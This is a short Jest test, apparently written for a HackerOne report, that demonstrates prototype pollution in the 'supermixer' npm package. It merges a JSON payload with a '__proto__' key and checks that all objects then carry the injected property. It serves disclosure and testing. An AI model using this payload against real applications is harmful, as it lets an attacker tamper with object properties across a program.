https://hackerone.com/reports/959987

test("prototype pollution in supermixer", () => {
    
    var mixer = require('supermixer');
    obj = {}

    expect({}.polluted).toBe(undefined);
    var payload = '{"__proto__":{"polluted":"yes"}}';//payload

    mixer.merge({},JSON.parse(payload));
    expect({}.polluted).toBe("yes");
  });
  